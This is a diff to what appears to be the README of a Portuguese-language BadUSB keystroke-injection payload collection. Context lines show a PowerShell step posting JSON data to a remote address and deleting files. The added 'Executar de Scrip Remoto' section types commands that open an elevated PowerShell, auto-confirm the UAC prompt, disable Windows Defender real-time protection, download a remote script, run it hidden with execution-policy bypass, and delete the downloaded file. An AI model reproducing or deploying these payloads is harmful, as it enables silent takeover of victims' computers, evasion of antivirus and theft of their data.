@@ -88,7 +88,7 @@ irm $w -me Post -bo $j -con 'application/json;charset=utf-8' -ea 0
 rm $p -r -fo -ea 0;
 exit
 ```
-## Script
+## Script Direto
 ```bash
 Delay 1000
 GuiR
@@ -104,4 +104,29 @@ WinPrintLine irm $w -me Post -bo $j -con 'application/json;charset=utf-8' -ea 0
 
 WinPrintLine rm *.xml -fo -ea 0
 WinPrintLine exit
+```
+## Executar de Scrip Remoto
+```bash
+Delay 1000
+GuiR
+WinPrintLine powershell Start-Process powershell -Verb runAs
+Delay 1000
+Press KEY_LEFT_ALT
+Press Y
+Release
+Delay 1000
+Press KEY_LEFT_ARROW
+PressRelease KEY_ENTER
+Release
+
+WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Definir URL do Script
+
+WinPrintLine $u='URL';
+WinPrintLine $d=New-Object Net.WebClient;
+WinPrintLine $f='t.ps1';$d.DownloadFile($u,$f);
+WinPrintLine powershell -w h -ep Bypass -c "gc $f -Raw|iex";
+WinPrintLine rm $f -ea 0;exit
+
 ```
